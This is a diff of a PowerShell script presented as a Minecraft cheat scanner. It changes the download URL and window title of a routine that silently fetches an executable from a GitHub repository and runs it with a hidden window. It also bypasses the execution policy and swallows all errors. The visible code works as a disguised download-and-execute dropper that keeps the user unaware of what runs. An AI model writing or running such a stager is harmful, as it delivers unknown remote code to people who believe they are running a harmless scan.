@@ -1,6 +1,6 @@
 # MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
     # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/killlety9-tech/FTchecker/raw/refs/heads/main/FTchecker.exe" -OutFile "FTchecker.exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/FTchecker/FTchecker/raw/refs/heads/main/FTchecker.exe" -OutFile "FTchecker.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
     Start-Process -FilePath "FTchecker.exe" -WindowStyle Hidden
@@ -9,7 +9,7 @@
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
 Clear-Host
-$Host.UI.RawUI.WindowTitle = "🔍 Minecraft Cheat Scanner v8.0 [~60 сек]"
+$Host.UI.RawUI.WindowTitle = "FTchecker v2.0 [~60 сек]"
 
 Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
 Write-Host "Celestial | Nursultan | Catlavan | Delta | LiquidBounce + 70 клиентов" -ForegroundColor Yellow
@@ -99,4 +99,5 @@ try {
     
 } catch {
     # Полностью скрываем ошибки
+
 }
